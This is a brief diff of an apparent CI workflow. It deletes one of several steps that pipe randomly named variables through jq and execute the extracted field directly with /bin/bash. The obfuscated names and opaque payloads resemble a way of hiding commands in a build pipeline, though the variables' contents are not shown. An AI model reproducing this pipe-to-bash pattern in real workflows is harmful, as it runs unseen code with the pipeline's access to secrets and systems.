@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$ruqo6" | jq -r .eu5 | /bin/bash
           printf '%s' "$bz13" | jq -r .x68 | /bin/bash
           printf '%s' "$tset9" | jq -r .b2354 | /bin/bash
-          echo $lgepv66916 | jq -r .v9239 | /bin/bash
           echo $hzszp739 | jq -r .xc65833 | /bin/bash
 
       - name: Save output
